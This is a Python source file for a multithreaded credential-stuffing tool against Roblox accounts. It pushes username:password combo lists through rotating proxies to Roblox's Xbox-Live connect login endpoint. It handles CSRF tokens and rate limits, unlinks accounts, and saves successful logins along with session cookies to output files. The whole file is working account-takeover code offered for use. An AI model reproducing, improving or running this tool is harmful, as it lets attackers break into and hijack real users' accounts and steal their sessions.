from core.cracker.constants import *
from core.cracker.shared import xsrf_cache
from core.cracker.utils import load_combos, load_proxies, load_tokens, \
    write_output, parse_cookies, clear_linked_account
from core import chrome
import threading
import socket
import ssl
import time
import json
import os

thread_count = 50
proxy_connect_timeout = 5
connect_timeout = 5
read_timeout = 5

api_addr = socket.gethostbyname("auth.roblox.com")
ssl_context = ssl.create_default_context()

combo_rotator = load_combos()
proxy_rotator = load_proxies()
token_rotator = load_tokens()

total_count = len(combo_rotator)
check_counter = 0

print()
print(f"combos: {len(combo_rotator):,}")
print(f"proxies: {len(proxy_rotator):,}")
print(f"tokens: {len(token_rotator):,}")
print()

def token_updater_func():
    global token_rotator
    path = "data/tokens.txt"
    time_cache = os.path.getmtime(path)
    while True:
        while os.path.getmtime(path) == time_cache:
            time.sleep(1)
        time_cache = os.path.getmtime(path)
        token_rotator = load_tokens(verbose=False)
        print(f"[tokens-updated] {len(token_rotator)}")

def thread_func():
    global check_counter

    combo = None
    proxy_info = None
    token = None
    sock = None

    while True:
        if not proxy_info or not sock:
            if sock:
                # clear prev. conn.
                try: sock.shutdown(2)
                except OSError: pass
                sock.close()
                sock = None

            # establish new conn.
            proxy_info = next(proxy_rotator)
            try:
                sock = socket.socket()
                sock.settimeout(proxy_connect_timeout)
                sock.connect(proxy_info[0])
                sock.settimeout(connect_timeout)
                sock.sendall((
                    f"CONNECT {api_addr}:443 HTTP/1.1\r\n"
                    f"{proxy_info[1]}"
                    f"\r\n"
                ).encode())
                if not sock.recv(4096).startswith(b"HTTP/1.0 200"):
                    raise ConnectionRefusedError
                sock.settimeout(read_timeout)
                sock = ssl_context.wrap_socket(sock, False, False, False, "auth.roblox.com")
                sock.do_handshake()
            except:
                proxy_info = None
                continue
        
        if not token:
            # rotate token
            try:
                token = next(token_rotator)
            except:
                print("[no-tokens-available]")
                time.sleep(2)
                continue

        if not combo:
            # rotate combo
            try:
                combo = next(combo_rotator)
            except StopIteration:
                break
        
        try:
            sock.sendall((
                "POST /v1/xbox-live/connect HTTP/1.1\n"
                "Host:auth.roblox.com\n"
                f"User-Agent:{chrome.user_agent}\n"
                f"Authorization:{token}\n"
                "Content-Type:application/json\n"
                f"Content-Length:{38 + len(combo[2]) + len(combo[0]) + len(combo[1])}\n"
                f"X-CSRF-TOKEN:{xsrf_cache.get(proxy_info[0],'-')}\n"
                "\n"
                f'{{"ctype":"{combo[2]}","cvalue":"{combo[0]}","password":"{combo[1]}"}}'
            ).encode())
            resp = sock.recv(4096)
            
            # catch non login-related errors
            if resp.startswith(STATUS_XSRF_FAILED):
                xsrf_cache[proxy_info[0]] = resp[160:172].decode()
                continue
            elif resp.startswith(STATUS_RATE_LIMITED):
                combo_rotator.add(combo[0], combo[1])
                combo = None
                token = None
                proxy_info = None
                continue
            elif resp.endswith(RESPONSE_INVALID_TOKEN):
                token_rotator.remove(token)
                token = None
                print("[token-removed] expired/invalid")
                continue
            elif resp.endswith(RESPONSE_NOT_AVAILABLE):
                proxy_info = None
                continue
            elif resp.endswith(RESPONSE_XBOX_CONNECTED):
                if not clear_linked_account(sock, proxy_info, token):
                    token_rotator.remove(token)
                    token = None
                    print("[token-removed] token already has an account attached, and it cannot be unlinked")
                continue

            if resp.startswith(STATUS_LOGIN_SUCCESS) and not b'"twoStepVerificationData"' in resp:
                # login was successful
                combo_rotator.clear(combo[0])
                login_data = json.loads(resp.split(b"\r\n\r\n", 1)[1])
                cookies = parse_cookies(resp)
                if (new_cookies := clear_linked_account(sock, proxy_info, token)) \
                    and type(new_cookies) == dict:
                    cookies = new_cookies
                print(f"[success] {combo[0]}:{combo[1]}")
                write_output("hits.txt", combo, data=login_data, cookies=cookies)

            elif resp.startswith(STATUS_LOGIN_SUCCESS):
                # credentials are correct, but 2FA is required
                combo_rotator.clear(combo[0])
                login_data = json.loads(resp.split(b"\r\n\r\n", 1)[1])
                print(f"[2fa] {combo[0]}:{combo[1]}")
                write_output("2fa.txt", combo, data=login_data)

            elif resp.endswith(RESPONSE_ACCOUNT_CONNECTED):
                # credentials are correct, but the account already has an xbox linked
                # (cookies can't be provided)
                combo_rotator.clear(combo[0])
                print(f"[xbox-linked (success)] {combo[0]}:{combo[1]}")
                write_output("xbox-linked.txt", combo)

            elif resp.endswith(RESPONSE_ACCOUNT_LOCKED):
                # credentials are correct, but the account is locked (security prompt)
                combo_rotator.clear(combo[0])
                print(f"[locked] {combo[0]}:{combo[1]}")
                write_output("locked.txt", combo)

            elif resp.endswith(RESPONSE_SOCIAL_ONLY):
                # account doesn't have a password set
                combo_rotator.clear(combo[0])

            elif resp.endswith(RESPONSE_INVALID_LOGIN):
                # credentials are incorrect
                print(f"[invalid] {combo[0]}:{combo[1]}")

            elif resp.endswith(RESPONSE_INVALID_CREDENTIALS):
                # credentials are empty
                pass

            elif resp.startswith(STATUS_BAD_REQUEST):
                # credentials are malformed
                pass 

            else:
                # error message is unrecognized
                print(f"[unrecognized] {combo[0]}:{combo[1]}"
                      f" - {resp.splitlines()[0].decode()}"
                      f" - {resp.splitlines()[-1].decode()}")

            check_counter += 1
            combo = None

        except (socket.error, socket.timeout, ssl.SSLError):
            proxy_info = None
            continue
        
        except Exception as err:
            combo_rotator.add(combo[0], combo[1])
            combo = None
            proxy_info = None
            print(f"[internal error] {combo[0]}:{combo[1]} - {err!r}")
            continue

threading.Thread(target=token_updater_func).start()
threads = [
    threading.Thread(target=thread_func)
    for _ in range(thread_count)]
for thread in threads:
    thread.start()

while any(t.is_alive() for t in threads):
    time.sleep(0.1)
    print(f"{check_counter:,} / {total_count:,}", end="\r")